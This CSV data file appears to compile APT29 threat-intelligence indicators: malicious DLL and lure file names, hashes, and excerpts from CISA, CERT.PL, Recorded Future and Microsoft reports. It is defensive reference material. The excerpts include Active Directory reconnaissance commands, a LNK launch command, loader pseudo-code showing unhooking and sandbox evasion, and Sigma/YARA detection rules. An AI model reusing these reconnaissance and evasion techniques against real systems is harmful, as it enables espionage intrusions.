1.0.0,actor--apt29,artifact--sha256:8a20780b884f7d23515a7785b21e22dff3977f75df565e970d0a6764f923a5ec,observation--sha256:f5f6ae6cdba697a28709b67b371b285fdc6282dabfcd5036f952446e7e486fd6,file-name,AclNumsInvertHost.dll,AclNumsInvertHost.dll,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:97e7f481d8aed86aa64983b984548f6c8ed831db047ab26e3ea97544568e8207,observation--sha256:d886f91ecb1ef337e7bb3ff0425cccd5e70355b874e773ca02fcb3c866e969c4,file-name,AddressResourcesSpec.dll,AddressResourcesSpec.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:ca463ba02924354a1d94252be2406b6ca11f315187ee2bb2c6d483ed3fad3f25,observation--sha256:8473951c32dc2b29d4b4abb0bdac3480cd2ff5a2275b7e47468310c3b6159e2a,file-name,Ambassador_Absense.docx,Ambassador_Absense.docx,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Executive Summary BlueBravo is a threat group tracked by Recorded Future’s Insikt Group that overlaps with the Russianadvanced persistent threat  APT  activity tracked as APT29 and NOBELIUM. APT29 and NOBELIUMoperations have beenpreviouslyattributedto Russia’sForeign Intelligence Service  SVR , anorganization responsible for foreign espionage, active measures, and electronic surveillance. In October2022 we identified BlueBravo staging GraphicalNeutrino malware within a mali",
1.0.0,actor--apt29,artifact--sha256:f048c3a687fc96d4965a86db81ff56a9ffcad0358e36d15b206b74e2361cf3be,observation--sha256:a6b1ebea0af680cb5403237478f9cc1de94ddec46946fe175ccad294012ca031,file-name,AppIsvSubsystems64.dll,AppIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Whenavictimtriestoopenanyof theLNKfiles, it triggerstheexecutionof thecommandcmd /cstart .$Recycle.Bin\windoc.exe && "".$Recycle.Bin\bmw[X].png"". Thiscommandisusedtolaunchwindoc.exeandopenaPNGfilecorrespondingtothenumber of theLNKfileopened.Windoc.exeservesastheinitial executionpoint for themalware, whilethePNGfileactsasadecoytodivert attentionawayfromthemalwareasit beginsitsexecutionwithintheWindoc.exeprocess. Windoc.exeisabenigncopyof theMicrosoft Wordapplicationthat",
1.0.0,actor--apt29,artifact--sha256:aa1af633dc17a3615d8086e820796c5395486007351a51b2c73deac2cbeafd5f,observation--sha256:b7aadf616b853c41f979321fd3b1002a8a52c8e098cd4226c53c48f57581b7ba,file-name,ApplicationFrameHost.exe,ApplicationFrameHost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:8fab7679adf0fcc2ff2977dd73f174d616b6c789f9e8d85f9066155669f01c9b,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA decrypt thecontentsof theXSD. Thedecryptedcontentscontainshellcodethat isthenexecutedtoextract andloadanembeddedDLL. Inadditiontotheencryptionroutine, theDLLmoduleengagesinadditional detectionevasiontechniquessuchascheckingtoensurethat it isnot runninginasandboxor under adebugger. Afterengagingintheseoperations, themoduleestablishespersistencebycopyingthecontentsof theISOfiletoadirectoryandcreatingaregistryrunkeytoexecutetheEXEduringsystemstartup.Subsequently, it decr",
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:9c7b4fdcd28a6646dfd1b339b695eb5271abcc0dee5a95878824c0c261618037,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/20 Appendix A – IOCs File IoCs Indicator Value Legitimate binary used for loading malicious DLL File Name Note .exe File Size 1597KB MD5 83863beee3502e42ced7e4b6dacb9eac SHA1 d9d40cb3e2fe05cf223dc0b592a592c132340042 SHA256 cb470d77087518ed7bc53ca624806c265ae2485d40ec212acc2559720940fb27 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 0e5ed33778ee9c020aa067546384abcb SHA1 fbb482415f5312ed64b3a0ebee7fed5e66,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:527c3c549120f5a3746f3aa1a5ba1bb567df589649ea1add0b9568ce122d27a0,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 2/20 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:30c73d25402a4b2f04a2462b95e54cb3f4a1a7f796999f7e7a91f10729d4bfc6,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/20 The adversary uses AppvIsvSubsystems64.dll import to facilitate HALFRIG execution. The following flowchart illustrates the module execution process: Figure 4 - HALFRIG execution flowchart AppvIsvSubsystems64.dll The first DLL to be loaded and executed by renamed WINWORD.EXE is AppvIsvSubsystems64.dll. This DLL simply spawns a new thread that resolves APIs and loads the next module. Figure 5 - DllMain function of the first stage of HA,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:8a2780958e5d2da98ffe7b95578da0ae821e2125c2c8cc4c1fbf4ea1512092b1,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 8/20 The new thread resolves the required APIs, loads, and executes the next stage. Figure 6 - the main AppvIsvSubsystems64.dll routine – loads and executes the next stage All HALFRIG DLLs use the same obfuscation techniques: − Strings are encrypted and decrypted during the exec ution. Plaintext strings are not re - encrypted or deleted after use. − To facilitate dynamic API resolving, HALFRIG utilizes a custom structure that stores modul",
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:84c815e9bf7990ec9c6d9759d6e176b97faa58a05a34b78188765da25b109308,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/20 msword.dll This module facilitates OPSEC (unhooking, checking for sleep() emulation, checking for process tree). The module contains a large number of inlined string decryption routines. The following listing presents (heavily) cleaned-up code of the msword.dll get export that is called by AppvIsvSubsystems64.dll: 1. __int64 get() 2. { 3. // 4. pUnhookedAPIs = getAPIs(&UnhookedAPIs); 5. pProcessModules = &UnhookedAPIs.K32EnumProcessM",
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:c25790d3e78832acbfdb6df4ab47faf4a8ea179cbe93ed7cb81b1c7be7204ae7,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/11 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db90067b84464e75548,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:800d2385375b1db419cc0992b3cd7518f0bded7a465df75e4d5d527ae6f18f64,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 6/11 HALFRIG Indicator Value Legitimate binary used for loading malicious DLL File Name Note .exe File Size 1597KB MD5 83863beee3502e42ced7e4b6dacb9eac SHA1 d9d40cb3e2fe05cf223dc0b592a592c132340042 SHA256 cb470d77087518ed7bc53ca624806c265ae2485d40ec212acc2559720940fb27 Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 0e5ed33778ee9c020aa067546384abcb SHA1 fbb482415f5312ed64b3a0ebee7fed5e6610c21a SHA256 d1455c4,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:c445ea0692d952b1ec070fcd2f8870bf9022d7ac146760cf826b17e079ba5c4c,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 8/11 QUARTERRIG Indicator Value Legitimate executable used to load the malicious DLL File Name Note.exe File Size 1600KB MD5 b1820abc3a1ce2d32af04c18f9d2bfc3 SHA1 b260d80fa81885d63565773480ca1e436ab657a0 SHA256 6c55195f025fb895f9d0ec3edbf58bc0aa46c43eeb246cfb88eef1ae051171b3 Indicator Value Virtual disc container File Name Note.iso File Size 2624KB MD5 22adbffd1dbf3e13d036f936049a2e98 SHA1 52932be0bd8e381127aab9c639e6699fd1ecf268 SHA256 c,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:1cabd4e3b74c7280cfbfe472535a4b49572f2c0edb1e1aff65223eea95aed652,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 11/36 Reconstructed export hashing can be illustrated using the following script: def hash(x): s = 0 for x in x.encode(): s = ror(s, 13) + x return s Hashed export name found in the shellcode corresponds to “runnder_dll”. >>> hash(""runner_dll\x00"") 3137192214 3rd Stage – Intermediate Shellcode Loader – runner.dll Runner.dll is an intermediate step loader – it is similar in implementation and in functionality to hijacker.dll. Runnder.dll i",
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:cdd130a50d4306a7399da5d744df60f68bf2773fe7831a996be0eda6d2389356,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 31/36 Appendix A – IOCs File IoCs Indicator Value Virtual disc container File Name Note.iso File Size 2624KB MD5 22adbffd1dbf3e13d036f936049a2e98 SHA1 52932be0bd8e381127aab9c639e6699fd1ecf268 SHA256 c03292fca415b51d08da32e2f7226f66382eb391e19d53e3d81e3e3ba73aa8c1 Indicator Value Legitimate executable used to load the malicious DLL File Name Note.exe File Size 1600KB MD5 b1820abc3a1ce2d32af04c18f9d2bfc3 SHA1 b260d80fa81885d63565773480ca1e4,
1.0.0,actor--apt29,artifact--sha256:a53b8b1529b6b9b858353f74a222a4ed0c3986610f7f31e18afdeae0d5222737,observation--sha256:ccca8579d25873e8bb03aa15d574ff08f9779223e85b838bdff1da527fe5c981,file-name,AppvIsvSubsystems64.dll,AppvIsvSubsystems64.dll,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 33/36 Network IoCs Indicator Value Virtual disc container File Name Note.iso File Size 2688KB MD5 3aca0abdd7ec958a539705d5a4244196 SHA1 bacb46d2ce5dfcaf8544125903f69f01091bc3d6 SHA256 10f1c5462eb006246cb7af5d696163db5facc452befbfd525f72507bb925131d Indicator Value QUATERRIG loader File Name AppvIsvSubsystems64.dll File Size 26KB MD5 9159d3c58c5d970ed25c2db9c9487d7a SHA1 6382ae2061c865ddcb9337f155ae2d036e232dfe SHA256 a42dd6bea439b79db9006,
1.0.0,actor--apt29,artifact--sha256:8122b33140343ce196727d1ba1efdac58e90907a00a89b0390f97dfd490b8ab7,observation--sha256:0cd94b83471916b60fa77549fbb5a76d98cfe57343f908cf7cd5bd6103fb3dfe,file-name,BlendMonitorStringBuild.dll,BlendMonitorStringBuild.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:7392bd0fda575ce83e626efb2d16b60a1c0dff9375b2f8a678b3b74bf33e5faf,observation--sha256:ae9d2340dca5fa79c996ce8d6531f3231427145489da517f45f5ba03491ece4a,file-name,BugSplatRc64.dll,BugSplatRc64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 4/11 IoC reference sheet SNOWYAMBER Indicator Value Sample dated 24/10/2022 File Name 7za.dll File Size 270,336B MD5 d0efe94196b4923eb644ec0b53d226cc SHA1 c938934c0f5304541087313382aee163e0c5239c SHA256 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c Indicator Value Sample dated 8/02/2023 File Name BugSplatRc64.dll File Size 271,360B MD5 cf36bf564fbb7d5ec4cec9b0f185f6c9 SHA1 8eb64670c10505322d45f6114bc9f7de0826e3a1 SHA256",
1.0.0,actor--apt29,artifact--sha256:7392bd0fda575ce83e626efb2d16b60a1c0dff9375b2f8a678b3b74bf33e5faf,observation--sha256:7583a3e663b7d4e61c2ee510fb1b6b680206c964b5a3545427aee2d30f922ce8,file-name,BugSplatRc64.dll,BugSplatRc64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 20/24 Appendix A – IOCs File IoCs Indicator Value Sample dated 24/10/2022 File Name 7za.dll File Size 270,336B MD5 d0efe94196b4923eb644ec0b53d226cc SHA1 c938934c0f5304541087313382aee163e0c5239c SHA256 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c Indicator Value Sample dated 8/02/2023 File Name BugSplatRc64.dll File Size 271,360B MD5 cf36bf564fbb7d5ec4cec9b0f185f6c9 SHA1 8eb64670c10505322d45f6114bc9f7de0826e3a1 SHA256 e",
1.0.0,actor--apt29,artifact--sha256:7392bd0fda575ce83e626efb2d16b60a1c0dff9375b2f8a678b3b74bf33e5faf,observation--sha256:bb9f5a730224c3fe27f19b63e7df1c8e550583571c69fb7e7176a6cd100b01ba,file-name,BugSplatRc64.dll,BugSplatRc64.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
1.0.0,actor--apt29,artifact--sha256:db2c6a6ac1b39f41838a785e4c96a20d0440ea2b440cc4c6a464e28ea7139274,observation--sha256:af6fc5b7b7fa0f65702b47a2458f4ee7f8a5a68e98c6dfc8ceb984f8aeed6cb2,file-name,ChildPaletteConnected.dll,ChildPaletteConnected.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:5aa3c261d5b603462dba9daaf37491adf0eb3bfa283ea0423f787ce9d2389f61,observation--sha256:aa17a85a5d6da0c365122968e8c1525b741a8226f27b15c3f716508d83a86c8e,file-name,DBUtils_2_3.sys,DBUtils_2_3.sys,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 21 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR - 'DBUtils_2_3.sys' selection_hash: Hashes|contains: - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd' - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5' condition: selection_name or selection_hash YARA rules The following rule detects most known GraphicalProton variants. rule APT29_GraphicalProton { strings: // C1 E9 1B shr ecx, 1Bh // 48 8B 44 24 08 mov rax, [rsp+30h+var_28]",
1.0.0,actor--apt29,artifact--sha256:9fb74ff87801eef29c998d8456a6eb65df0c58a559be7e065ed43930992dd803,observation--sha256:e8e3b149516ad59aff975f15c8972e53d821966be2e3dea088caef1732383812,file-name,DIPLOMATIC-CAR-FOR-SALE-BMW.pdf,DIPLOMATIC-CAR-FOR-SALE-BMW.pdf,candidate,,unknown,unknown,not-stated,2023-01-01T00:00:00Z,source--apt29--0ddae757385c9dcc,APT29/APT29 attacks Embassies using CVE-2023-38831 - report en.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"OldAndNewTactics APT29's persistence in using the BMWcar for sale theme as a lure in their phishingattacks has taken on a newdimension with the deployment of a thematicallynamedRAR archive, ""DIPLOMATIC-CAR-FOR-SALE-BMW.rar."" This archive contains arecently disclosed and exploitable vulnerability, CVE-2023-38831. This vulnerability,which came to light in April 2023, is rooted in the mishandling of ZIP archives thatseeminglycontaininnocuous ﬁles, like standard.PDFdocuments, andfolderssharingidenti",
1.0.0,actor--apt29,artifact--sha256:bb05b5966f46ff0059e42a955b6894450b695f43ca29575755b2ac48fc390115,observation--sha256:bffbd61b1a1a71fd601af2cbb9e3a7fd99045350680df917729e839890883cb8,file-name,DIPLOMATIC-CAR-FOR-SALE-BMW.rar,DIPLOMATIC-CAR-FOR-SALE-BMW.rar,candidate,,unknown,unknown,not-stated,2023-01-01T00:00:00Z,source--apt29--0ddae757385c9dcc,APT29/APT29 attacks Embassies using CVE-2023-38831 - report en.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"OldAndNewTactics APT29's persistence in using the BMWcar for sale theme as a lure in their phishingattacks has taken on a newdimension with the deployment of a thematicallynamedRAR archive, ""DIPLOMATIC-CAR-FOR-SALE-BMW.rar."" This archive contains arecently disclosed and exploitable vulnerability, CVE-2023-38831. This vulnerability,which came to light in April 2023, is rooted in the mishandling of ZIP archives thatseeminglycontaininnocuous ﬁles, like standard.PDFdocuments, andfolderssharingidenti",
1.0.0,actor--apt29,artifact--sha256:97916b86c12d4c9523e78f539830233eabf77a362a5795056b56397ae7b070df,observation--sha256:4b3af1a74cd4d0469e9ac18052c823f110294d18d09770e897099adfea633d2f,file-name,DeregisterSeekUsers.dll,DeregisterSeekUsers.dll,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:9690bf88efad93fda6538a7ffc9b606a828e8769f6c4b05f5a1087facdcae9fd,observation--sha256:5fa31e1da5e95746ee87677060c8da0cb618df73c28ee92684ebd7148ee2c4e4,file-name,Device Configuration Verification.rdp,Device Configuration Verification.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 290}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,Device Configuration Verification.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:4eef66f969783082d4c805e550109570431c6409a153c81445c77a317355fea4,observation--sha256:6665c9e882521114ebfae477099227b8b687c338d7de8021195e46c217b941fb,file-name,Device Security Requirements Check.rdp,Device Security Requirements Check.rdp,confirmed,2024-10-01T00:00:00Z,month,known,column:observed_at,2024-10-29T00:00:00Z,source--microsoft-apt29-rdp-2024,profiles/apt29/osint-observables/microsoft-rdp-2024.csv,"{""row"": 291}","[""activity--apt29-rdp-phishing-2024""]",[],"[""infra--apt29-actor-controlled-rdp""]","[""phishing-attachment""]",1,false,high,TLP:CLEAR,csv-row,Device Security Requirements Check.rdp file-name 2024-10 activity--apt29-rdp-phishing-2024 infra--apt29-actor-controlled-rdp phishing-attachment,All 281 published domains and 14 unique RDP attachment names extracted from the source IOC section.
1.0.0,actor--apt29,artifact--sha256:69d247e9fbe197284fce9464f14e7ae02d2265454132e08fd65aa6a3cf882514,observation--sha256:16cba4e0b0031b929e72c117fd1612950654a1cfe9e34223240a0e8b38984ab3,file-name,Envsrv.dll,Envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 11/20 envsrv.dll Envsrv.dll is responsible for facilitating persistence via the Run registry key. Envsrv.dll has one export (named unify, ord #2). It closely follows a previously established pattern, reusing exactly the same code blocks. A simplified codeflow is presented on the listing below: 1. __int64 unify() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleepEmulation(); 7. Initialize",
